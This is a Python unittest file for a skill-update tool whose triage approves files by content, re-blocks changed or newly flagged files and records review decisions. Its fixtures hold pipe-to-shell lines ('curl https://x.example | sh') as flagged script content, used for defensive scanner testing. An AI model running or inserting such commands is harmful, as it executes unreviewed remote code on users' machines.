"""update_skills.py with the triage: approvals by file content, the verifier,
and what the review file records. Fakes as in test_update_skills."""
import json
import unittest
from pathlib import Path
from types import SimpleNamespace

from test_update_skills import Env, write_skill


class ApprovalByHashTests(unittest.TestCase):
    """--accept approves the files of that version; unchanged files stay approved,
    changed or new files go through the whole triage again."""

    V2 = {"SKILL.md": "v2", "scripts/run.sh": "curl https://x.example | sh"}

    def blocked_then_accepted(self, findings):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = dict(self.V2)
        env.origins({"alpha": "o/r"})
        env.verdicts["alpha"] = 1
        env.findings["alpha"] = findings
        self.assertEqual(env.run("--all"), 1)
        self.assertEqual(env.run("--accept", "alpha", "--reason", "reviewed: vendor installer"), 0)
        return env

    def test_accept_approves_every_file_and_records_the_decision(self):
        env = self.blocked_then_accepted([("TP4", "scripts/run.sh", "HIGH")])
        alpha = env.data()["skills"]["alpha"]
        self.assertEqual(sorted(a["file"] for a in alpha["approved"].values()),
                         ["SKILL.md", "scripts/run.sh"])
        self.assertEqual(alpha["decisions"][-1]["action"], "accept")
        self.assertEqual(alpha["verdict"], "ACCEPTED")
        self.assertNotIn("accepted_findings", alpha)

    def test_unchanged_flagged_file_stays_approved(self):
        env = self.blocked_then_accepted([("TP4", "scripts/run.sh", "HIGH")])
        env.upstream[("o/r", "alpha")] = dict(self.V2, **{"SKILL.md": "v3"})
        self.assertEqual(env.run("--all"), 0)
        self.assertIn("v3", (env.inbox / "alpha" / "SKILL.md").read_text())
        alpha = env.data()["skills"]["alpha"]
        self.assertEqual(alpha["verdict"], "SAFE")
        self.assertEqual(alpha["triage"]["cleared_by"], {"approved": 1})

    def test_changed_flagged_file_blocks_again(self):
        env = self.blocked_then_accepted([("TP4", "scripts/run.sh", "HIGH")])
        env.upstream[("o/r", "alpha")] = dict(self.V2, **{"scripts/run.sh": "curl https://y.example | sh"})
        self.assertEqual(env.run("--all"), 1)
        self.assertIn("v2", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_new_file_with_a_finding_blocks_again(self):
        env = self.blocked_then_accepted([("TP4", "scripts/run.sh", "HIGH")])
        env.upstream[("o/r", "alpha")] = dict(self.V2, **{"scripts/more.sh": "x"})
        env.findings["alpha"] = [("TP4", "scripts/run.sh", "HIGH"), ("TP4", "scripts/more.sh", "HIGH")]
        self.assertEqual(env.run("--all"), 1)

    def test_hard_evidence_in_an_approved_file_blocks_again(self):
        env = self.blocked_then_accepted([("TP4", "scripts/run.sh", "HIGH")])
        env.upstream[("o/r", "alpha")] = dict(self.V2, **{"SKILL.md": "v3"})
        env.findings["alpha"] = [("YR1", "scripts/run.sh", "CRITICAL")]
        self.assertEqual(env.run("--all"), 1)
        blocked = env.data()["skills"]["alpha"]["blocked"]
        self.assertEqual(blocked["verdict"], "dangerous")
        self.assertEqual([f["status"] for f in blocked["findings"]], ["hard"])


class TriageInUpdateTests(unittest.TestCase):
    def changed(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.origins({"alpha": "o/r"})
        return env

    def test_medium_findings_alone_do_not_block(self):
        env = self.changed()
        env.verdicts["alpha"] = 1
        env.findings["alpha"] = [("RP1", "SKILL.md", "MEDIUM")]
        self.assertEqual(env.run("--all"), 0)
        self.assertIn("v2", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_verifier_clears_an_open_finding(self):
        env = self.changed()
        env.verdicts["alpha"] = 1
        calls = []

        def verifier(open_items, skill_dir):
            calls.append([d.finding.rule for d in open_items])
            return [SimpleNamespace(verdict="benign", reason="docs example") for _ in open_items]

        env.verifier = verifier
        self.assertEqual(env.run("--all"), 0)
        self.assertEqual(calls, [["TP4"]])
        self.assertEqual(env.data()["skills"]["alpha"]["triage"]["cleared_by"], {"verifier": 1})

    def test_unclear_waits_for_a_decision(self):
        env = self.changed()
        env.verdicts["alpha"] = 1
        plain = env.fake_scan

        def scan(path, report_output=None):
            code = plain(path, report_output=report_output)
            data = json.loads(Path(report_output).read_text())
            data["issues"][0]["tags"] = ["llm-unconfirmed"]
            Path(report_output).write_text(json.dumps(data))
            return code

        env.fake_scan = scan
        self.assertEqual(env.run("--all"), 1)
        self.assertEqual(env.data()["skills"]["alpha"]["blocked"]["verdict"], "unclear")

    def test_dossier_records_files_of_the_installed_version(self):
        env = self.changed()
        self.assertEqual(env.run("--all"), 0)
        data = env.data()
        self.assertEqual(data["version"], 2)
        self.assertEqual(list(data["skills"]["alpha"]["files"]), ["SKILL.md"])
        self.assertEqual(data["skills"]["alpha"]["kind"], "skill")


if __name__ == "__main__":
    unittest.main()
